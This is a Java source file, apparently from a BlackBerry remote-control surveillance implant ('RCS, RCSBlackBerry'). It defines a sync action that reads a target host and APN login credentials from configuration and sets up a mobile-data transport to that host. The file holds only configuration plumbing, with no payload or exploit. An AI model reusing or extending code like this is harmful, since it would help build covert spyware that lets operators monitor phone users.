//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.action.sync;

import blackberry.Messages;
import blackberry.action.Apn;
import blackberry.action.sync.transport.ApnTransport;
import blackberry.config.ChildConf;
import blackberry.config.ConfAction;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class SyncActionApn extends SyncAction {
    //#ifdef DEBUG
    private static Debug debug = new Debug("SyncActionApn", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    String host;
    Apn apn;

    public SyncActionApn(ConfAction conf) {
        super(conf);
    }

    protected boolean parse(final ConfAction params) {

        try {
            host = params.getString(Messages.getString("d.1")); //$NON-NLS-1$

            //#ifdef DEBUG
            debug.trace("parse host: " + host); //$NON-NLS-1$
            //#endif

            apn = new Apn();
            ChildConf apnConf = params.getChild(Messages.getString("d.4")); //$NON-NLS-1$

            apn.apn = apnConf.getString(Messages.getString("d.5")); //$NON-NLS-1$
            apn.user = apnConf.getString(Messages.getString("d.6")); //$NON-NLS-1$
            apn.pass = apnConf.getString(Messages.getString("d.7")); //$NON-NLS-1$

            if (!apn.isValid()) {
                //#ifdef DEBUG
                debug.error("parse, apn not valid");
                //#endif
                return false;
            }

        } catch (final ConfigurationException e) {
            //#ifdef DEBUG
            debug.error("params FAILED"); //$NON-NLS-1$
            //#endif
            return false;
        }
        return true;
    }

    protected boolean initTransport() {
        //#ifdef DEBUG
        debug.trace("initTransport");
        //#endif
        
        transports.addElement(new ApnTransport(host, apn));
        return true;
    }

    //#ifdef DEBUG
    public String toString() {
        return "SyncApn "; //$NON-NLS-1$
    }
    //#endif

}
